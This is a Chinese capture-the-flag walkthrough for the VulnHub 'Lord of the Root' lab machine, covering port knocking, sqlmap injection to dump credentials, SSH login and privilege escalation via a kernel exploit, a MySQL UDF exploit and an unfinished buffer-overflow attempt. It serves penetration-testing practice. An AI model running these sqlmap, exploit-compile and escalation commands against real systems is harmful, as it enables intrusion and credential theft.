> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RcdNhvbUh9A-ZMdnoULYMQ)

![](https://mmbiz.qpic.cn/mmbiz_png/9Ku2t1uaSwDSnPM80libzbs8ofzicXbQesVN9mGMnqZPxqCS8gUoHLkVWJkEPByShv4ul050UUYX4Phfnnc5lLJQ/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/lord-of-the-root-101,129/

靶机难度：中等（CTF）

靶机发布日期：2015 年 9 月 23 日

靶机描述：这是 KoocSec 为黑客练习准备的另一个 Boot2Root 挑战。他通过 OSCP 考试的启发准备了这一过程。它基于伟大的小说改制电影《指环王》的概念。

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaRSfuVibrT80ovdTMiaZM0gZOFHmtS8KYVtVHtFNaz9XcENaibWibgmw8JIn1niaCurDOrBCjUbQ8az7fdzNMu8kTrw/640?wx_fmt=png)

  

  

一、信息收集

  

  

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9WMt60BvibUMRf7St8PKLviaRtwadiaRPogITsdb0icgabZSTH95micChQXA/640?wx_fmt=png)

使用命令：nmap -sP 192.168.182.0/24

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.182.146

我们开始探索机器。第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了 nmap 扫描：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M96UfoSibo8tDQ1Sg0Vg71F7Fs04dU4iaZEerIw8iccUFnNtkzRJAzeV8jg/640?wx_fmt=png)

使用命令：nmap -sS -sV -T5 -A -p- 192.168.182.146

扫描出仅开放一个 22 端口，尝试通过 SSH 连接...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9Yh6QnuVpkg0x6FReKBtKaxWtub5aEiaZSwWv9MvxKLnKGELtXKIHZvA/640?wx_fmt=png)

Easy as 1,2,3

端口碰撞：端口上的防火墙通过产生一组预先指定关闭的端口进行连接尝试，一旦接收到正确的连接尝试序列，防火墙规则就会动态修改，以允许发送连接尝试的主机通过特定端口进行连接。

这边使用 ping 命令冲撞三次试试 1,2,3

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9ofMSZw0ia89negYibvmfxDT3ddeCsMbXecNibmUuOicDhgiaKkq0rJTLia3g/640?wx_fmt=png)

命令：hping3 -S 192.168.182.146 -p 1 -c 1

通过 ping 冲撞之后，防火墙规则会修改，重新扫描一次试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9pBYGuOcvPICXq4LBbHxD6GDSjYg7FRy3DAZAOWYAEmB2gDrZzNCh5Q/640?wx_fmt=png)

扫出了 1337 端口，直接访问试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9iaH1o5H6BwIkxmLFy3hBiaWwbyvfN2qpmNpu9ocgwmDLKDExutvpDA4A/640?wx_fmt=png)

打开就一张图，然后我还检查了源代码，没有找到有用信息....

以后在渗透任何系统时，都要查看下 robots.txt 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9Bnq4iazve8nUgZr0U1LQtQ5nGVY8rxnqjQP80Chfg8NrPF4z3Z6kGhQ/640?wx_fmt=png)

查看源代码

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9ib6PBwNOUvkqYuyS2SYyP5qz4dEqPnyib8CBiaOWotFImMgBX0viaKcp8A/640?wx_fmt=png)

找到 base64 值：THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh，去网上解密

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9FzcbVsiaqOXQzR9kWxJ75rapiax6ib0MqA8bnqWWRGiaaN1ibjwA1FNX9vg/640?wx_fmt=png)

或者在 kali 里面进行解密

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9WsYK812ibVibu9r5s0wnMX5VsSqUr2NLhvRPhicUZP6kfIEqFM2Ppj7Cg/640?wx_fmt=png)

输出 Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!

输出还是 base64 值... 继续进行二次解码！！！Lzk3ODM0NTIxMC9pbmRleC5waHA=

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M95OJ6KuUBy6oqNTwIuw5Q90Lq656IcgnrgqBhoUtzib5DjFibn8xEuLRQ/640?wx_fmt=png)

输出：/978345210/index.php

一看就知道是目录，继续访问

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9bVyQicrbBxogXYdhLqXHGiaZmiawO2rbrPSSSY9c83RbrL6vUuibHCJpIg/640?wx_fmt=png)

目前不知道确切的用户名和密码，可以使用 SQLMAP 进行基于登录表单的注入查看，检索数据库名称和登录凭据 

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9aUItx8N7GcVOPRZtiaLZhgr1ocTmYvXAWRJwnL7IReIvDhCbLSJjlYg/640?wx_fmt=png)

命令：sqlmap -o -u "http://192.168.182.146:1337/978345210/index.php" --forms --dbs

继续获取 webapp 数据表信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M94fFrU4xjUhAIYsvvQwSiboRBfBuA7nc2WeHHjBVcN1bU1GXzxQ7UicbA/640?wx_fmt=png)

命令：sqlmap -o -u "http://192.168.182.146:1337/978345210/index.php" --forms -D Webapp --tables

这里可以看到 Users 数据表，继续查看数据表信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M94bKOQ16P46sHCib6mKW8ACpB3tl6RvJjApH9RJOdD8CP1xRfibLOyGwQ/640?wx_fmt=png)

命令：sqlmap -o -u "http://192.168.182.146:1337/978345210/index.php" --forms -D Webapp -T Users --columns

这里看到了一些专栏，进行转储选出最终结果

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9KX7x7k1L446usgibY3QdtfRd6Hvibz9anBQTFVM3mROAOXQ2Q2XiaUwNg/640?wx_fmt=png)

命令：sqlmap -o -u "http://192.168.182.146:1337/978345210/index.php" --forms -D Webapp -T Users -C id,username,password --dump

获得了这些用户名密码

将这些用户名和密码保存在两个不同的文本中，使用 msfconsole 来破解 SSH 正确的账号密码

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9aobia4kuFrxARXbkFUtudR0RBNiby7nf0auqewjv5FJib5WFDSPFw8SOQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9iccGNCAZftmfBKc9VB5WKH4pJTrnySwXVmO02p4ryluJTBGYnWW2XEA/640?wx_fmt=png)

账号密码：smeagol、MyPreciousR00t

  

  

二、三种提权方式

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/dC6kVnzP6lz7YGqPicKgicA3ZkHD1L4vFhNeFGt4ajUDTqe9Mpq7TyvIiaqdkbmmIibDPsQeOtCI2ficowRnwIl2Eng/640?wx_fmt=png)

Linux 内核提权

![](https://mmbiz.qpic.cn/mmbiz_png/4MjjqK8GtuAfYMfD9RtS08VlmC9GLKPNOGpMfw0pWXQFpmVAAibXaHGdG1tD96Mia9WnxF43AlNcq3MYZpY6aT0g/640?wx_fmt=png)

SSH 登录

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9icbMpTSDNOQbmS9p7hvwNYfnJ8rWoIBn3OZr9ykwRYCMnCicahDA0J6w/640?wx_fmt=png)

命令：ssh smeagol@192.168.182.146

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9v4G4T5m1035sbLJI0yTX6E5FQUDcsEzNjoItCALN4QWArOkTV0VVRw/640?wx_fmt=png)

查看到 ubuntu 14.04 的版本

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9R6OHpG4X3kgkyOj9kewpoUKfnnBGibDP9WevZia8rEcoNQ4o74bCLZFw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9g2scvb9fQ7wzBPEBZfoZwN4icWPqS5oR0LjCmbITpop35iaQIprMhx5A/640?wx_fmt=png)

我们使用 39166.c 进行提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M926DjRibbH2TCMIoS7MDvxHY80ic03BcWkjkxK07lI3TH7fr6tfFkW8ww/640?wx_fmt=png)

提取 shell 到本地，开启服务，准备上传 shell

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9bMNibhcLicMKSheoF6Yn1ObwiaaHkC90jv1vMh6oQU4bpbkJgZ3rFGlRQ/640?wx_fmt=png)

通过 python 开启服务上传 shell，并进行 gcc 编译，继续提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9bBepKk9HLtVjU1aC1vtQk8zUWIeh0YnrxY5WL4ZVZP3ADliaSnyI6bw/640?wx_fmt=png)

执行 shell 后，提权成功，并完成任务！！！

![](https://mmbiz.qpic.cn/mmbiz_png/dC6kVnzP6lz7YGqPicKgicA3ZkHD1L4vFhNeFGt4ajUDTqe9Mpq7TyvIiaqdkbmmIibDPsQeOtCI2ficowRnwIl2Eng/640?wx_fmt=png)

以 root 身份运行 MySQL 提权

![](https://mmbiz.qpic.cn/mmbiz_png/4MjjqK8GtuAfYMfD9RtS08VlmC9GLKPNOGpMfw0pWXQFpmVAAibXaHGdG1tD96Mia9WnxF43AlNcq3MYZpY6aT0g/640?wx_fmt=png)

早先查看正在运行的进程时，发现 mysql 以 root 身份运行，同时检查数据库版本是 5.5.44....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9jh6UCpRIvsCLY67junwKS6dA6kYhLoFAwyNArWiaBicBOVniaPwnoB9Ug/640?wx_fmt=png)

命令：ps aux | grep mysql

命令：mysql --version

有了以上信息，需要 exploit 进行反弹 shell 提权，继续有所数据库信息看看有哪些，我这边进行范围缩小搜索（例如：删除针对 Windows，远程或拒绝服务的漏洞利用的 shell）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9CicUE3oibHP74o40iacGtxS5GuhmLSjTDiapsdm1t0DI3RiaBIibJvUjjAkw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9GQO11KPppNBGUVlpe8X5H5QhakVfmFShpG1ReibsHxNuEYibX9TCh1Vg/640?wx_fmt=png)

将 1518.c 的 shell 上传到 smeagol 用户下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9AgQYCB0RZUvkYae8gUdU5Ph0cnsm1zibZPSwZIDIpIOrMqqDJm8xXkg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9UcUf8icfCV0J3vyXIfHAmvBjTb9qzQYc4TSmonyyJdavY2t06XdpAQw/640?wx_fmt=png)

我们参考 1518.c 脚本内容进行输入命令，制作反弹 shell

命令：gcc -g -c raptor_udf2.c

命令：gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

这边需要在数据查找到 mysql 的 root 密码！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9CZ3o1y6ZJCu9VFjqyngiby2CS5ibFicpHVvGrkKC0ka51gO2ibkKgmbKYA/640?wx_fmt=png)

查看 www 目录下的文件...（一般都在这儿找）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9Os5icxIKSk6n3aLIEMsMvX2iaQtuBQdz8Mm1X7fAMAIxYhn68cxyy6cQ/640?wx_fmt=png)

找了 10 多分钟在 login.php 中找到了 root 的登录密码 darkshadow（这是数据库的登录...）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9JgtQw3DA8kykTicuU8zolfXYuSrN0KeYdWqOicWWsesSwLe6EsPAOGCA/640?wx_fmt=png)

继续参考 shell 命令进行渗透提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M95OzBPg6NnLGdNKSBrEFlRw77qhnfcUI91wqSXqh71XPESBK1Owq6yA/640?wx_fmt=png)

最后 \! sh 执行完就获得了 root 权限！！

![](https://mmbiz.qpic.cn/mmbiz_png/dC6kVnzP6lz7YGqPicKgicA3ZkHD1L4vFhNeFGt4ajUDTqe9Mpq7TyvIiaqdkbmmIibDPsQeOtCI2ficowRnwIl2Eng/640?wx_fmt=png)

缓冲区溢出提权

![](https://mmbiz.qpic.cn/mmbiz_png/4MjjqK8GtuAfYMfD9RtS08VlmC9GLKPNOGpMfw0pWXQFpmVAAibXaHGdG1tD96Mia9WnxF43AlNcq3MYZpY6aT0g/640?wx_fmt=png)

学过缓冲区溢出提权，都会了解到 SECRET 文件夹目录，我们来找找

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M98g7Wo8znTHHBVut9kll847U6TLJHg5SMSmCR5E8G8vUMKOPpiaTmUqw/640?wx_fmt=png)

命令：find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

-rwsr-xr-x 1 root root 7370 Sep 17  2015 /SECRET/door2/file

-rwsr-xr-x 1 root root 7370 Sep 17  2015 /SECRET/door1/file

-rwsr-xr-x 1 root root 5150 Sep 22  2015 /SECRET/door3/file

每个文件夹都有一个可执行文件，需要输入字符串才能执行

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9qcKCmFyspDR34ibfZ9F083BNWIhhicUTy6tHL06LiaP8kcl42k0snVNhg/640?wx_fmt=png)

尝试是否在这里可以利用缓冲区溢出提权

易受攻击的文件会文件夹之间随机移动，要确认是哪个文件，可以使用 file 命令来比较每个文件的哈希值

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9hIXQiaia7nOkrKTNEGuB8jlOluHTricOkObQgMpJSeiaf2EGSiaqMLDYLYg/640?wx_fmt=png)

命令：file door1/file door2/file door3/file

还可以比较使用 ls -lahR 创建的文件大小和日期

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9ncopTrPA0SZUXMUZ6XNT6onXPYfOrgbNz9UrQyic98Z6InpABJmL1uQ/640?wx_fmt=png)

命令：ls -laR

还可以比较文件大小为 du  -b 字节

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9SgPxwBXAmYc8QrrRBC6Aw1NwFtniaXcINF8FRYLljXib7VOJCLAQVLGA/640?wx_fmt=png)

命令：du -b door1/file door2/file door3/file

目前是 door3

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9lwnb2Vx2cqBaZtqxogEKEUoyTLxYkicjWHJcvvs6bzswIM0IfHbDuqw/640?wx_fmt=png)

命令：cp door3/file /home/smeagol/bof

将文件复制到 bof 目录下，方便进行进一步测试

为了确认是否受到攻击，使用 python 命令快速模糊找出崩溃的字符数

首先发送 100 个 “A” 不会执行任何操作

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M95SicOliahTIbhibrFVuH8OOCSdEnmKnAWLic5hjvibRn4r1P2COYb66fs8w/640?wx_fmt=png)

命令：./bof $(python -c 'print"A"* 数字')

但是 200 个会导致分段错误，继续往回看，我们发现 171 是崩溃的确切位置

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M96gtXrykxSZgtjiayp30jP0zFtKhcBF4IHSulbLe5sofHicMNn32T3uAg/640?wx_fmt=png)

命令：base64 bof

二进制文件的快速替代方法是使用 base64，使用 base64 的 fileName 编码二进制文件，将值复制到一个文本里即可！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9qibLiaucAeYicKOz9AuiahU3Yics9SGBHgYOEVRSpuoRbmNmfjvM8ibUh8fQ/640?wx_fmt=png)

然后将 base64.txt 文件读入 base64 命令并解码为输出文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9X9ErBMrKiauWF6DKOEK4lDEcib5tuJNxHbia4H0Vwm690R2JKtvicNVklw/640?wx_fmt=png)

命令：cat base64.txt | base64 -d > bof

命令：file bof

要继续进行下一步，检查下文件类型之前 file door1/file...... 查看到的哈希值一样

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9UnDsZUZgOQaTvm25ibrjdnQ8c1qgG7BWcKPHLjk6uHB2Eyu1mXG0fLw/640?wx_fmt=png)

还可以使用命令：objdump -d –no-show-raw-insn bof

从文件中获取更多信息，有几个值得注意的 c 关键字，特别是 strcpy

下一步是创建基本的框架脚本，使用前面收集的 171 崩溃信息，用 python 脚本，EIP 框架分析等等，这里是我目前的弱项，我没继续下去，我看了 3 个小时没有任何头绪，思路应该没错，无奈的学得还不够多知识点缺乏啊！！后期会补上缓冲区溢出的方法过程，这是比较难的一种提权！！

我们进入 root 根目录查看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9QZDFAHq6O0jHXc98bRWO0XcP4tyUDKeknK11p3BRXqaiaV1MQVHscTw/640?wx_fmt=png)

有几个文件阻碍了 SECRET 目录下提权的难度！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9iaHCv8y8a9qiazHZYk5cFEkiaGW2EvD9QDZ1G3EtAqGorPZ8JONuic2PfA/640?wx_fmt=png)

python 脚本下 switcher.py 每三分钟变换一次值....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9Pk6Zgj5icsrtBZnVcZ2b5dVc7tSWJdxytbdaoOgpj4jNibskU94uum7w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/9Ku2t1uaSwDSnPM80libzbs8ofzicXbQesVN9mGMnqZPxqCS8gUoHLkVWJkEPByShv4ul050UUYX4Phfnnc5lLJQ/640?wx_fmt=png)

还会打乱缓冲区溢出的 “buf” 文件，因此让缓冲区溢出难度加大，做到这里头很痛了....

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了 CTF 靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaRSfuVibrT80ovdTMiaZM0gZOFHmtS8KYVtVHtFNaz9XcENaibWibgmw8JIn1niaCurDOrBCjUbQ8az7fdzNMu8kTrw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M90xSIBk08gkvgOJL7DSxv8laaiaopeWXEZSELyY5icYx7wHR278DW7NZQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqYVrsBCSBRQUREVGcu2M9icKrv5cKLa9bQSxvR2nRJfrZpAzrNibHeDdjibnX34BwrovsZLMRtzUng/640?wx_fmt=png)